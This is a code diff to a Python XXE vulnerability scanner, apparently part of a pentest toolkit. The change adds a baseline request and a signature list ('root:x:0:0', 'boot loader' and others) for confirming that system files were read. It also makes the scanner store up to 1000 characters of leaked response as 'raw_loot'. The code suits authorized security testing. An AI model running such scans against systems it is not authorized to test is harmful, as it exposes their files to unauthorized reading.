@@ -29,20 +29,36 @@ class XXEScanner:
         for ep in endpoints:
             try:
                 target_url = base_url + ep
+                
+                # 0. Baseline (GET/POST without payload)
+                try:
+                    baseline_r = http_client.post(target_url, options=getattr(self, "options", None), data="<root>test</root>", headers={'Content-Type': 'application/xml'}, timeout=3)
+                    baseline_text = baseline_r.text if baseline_r.status_code == 200 else ""
+                except:
+                    baseline_text = ""
+
                 headers = {'Content-Type': 'application/xml'}
                 r = http_client.post(target_url, options=getattr(self, "options", None), data=payload, headers=headers, timeout=5)
                 
-                if "root:x:0:0" in r.text or "bin/bash" in r.text:
+                # Differential signature check
+                sigs = ["root:x:0:0", "bin/bash", "/sbin/nologin", "boot loader", "[extensions]"]
+                hit = False
+                for sig in sigs:
+                    if sig in r.text and sig not in baseline_text:
+                        hit = True
+                        break
+
+                if hit:
                     findings.append({
-                        "title": "CRITICAL: XXE Injection Detected",
-                        "description": f"The application at `{target_url}` is vulnerable to XML External Entity (XXE) injection. It processed our payload and returned system file content.",
+                        "title": "Critical XXE Injection",
+                        "description": f"The XML parser at `{target_url}` is vulnerable to External Entity Injection.\nSuccessfully read system files via differential analysis.",
                         "severity": "critical",
-                        "tool_source": "xxe_scanner",
-                        "raw_loot": target_url,
+                        "confidence": "high",
+                        "tool_source": "xxe_expert",
                         "method": "POST",
                         "payload": payload,
-                        "status_code": r.status_code,
-                        "response_snippet": r.text[:200] if len(r.text) > 200 else r.text
+                        "url": target_url,
+                        "raw_loot": r.text[:1000]
                     })
                     if logger: logger(f"💀 XXE CONFIRMED: {target_url}", "CRITICAL")
             except Exception:
